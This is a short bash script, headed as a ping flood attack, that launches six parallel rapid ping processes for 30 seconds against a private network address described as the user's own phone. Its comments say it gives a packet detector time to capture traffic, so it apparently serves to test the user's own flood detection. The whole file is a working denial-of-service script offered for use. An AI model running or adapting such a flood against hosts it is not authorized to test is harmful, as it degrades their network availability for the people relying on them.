#!/bin/bash

# Ping Flood Attack Script (Linux)
# ⚠️ For educational and authorized testing only

TARGET_IP="192.168.0.139"  # Change to your mobile's IP

echo "[*] Starting ping flood attack on $TARGET_IP..."
echo "[*] This will run for 30 seconds to give the detector time to capture packets"

# Method 1: Continuous ping with short interval for 30 seconds
timeout 30s ping -i 0.1 $TARGET_IP &

# Method 2: Multiple ping processes in parallel
for i in {1..5}; do
    timeout 30s ping -i 0.2 $TARGET_IP &
done

echo "[*] Ping flood attack running... Press Ctrl+C to stop early"
wait

echo "[+] Ping flood attack completed."
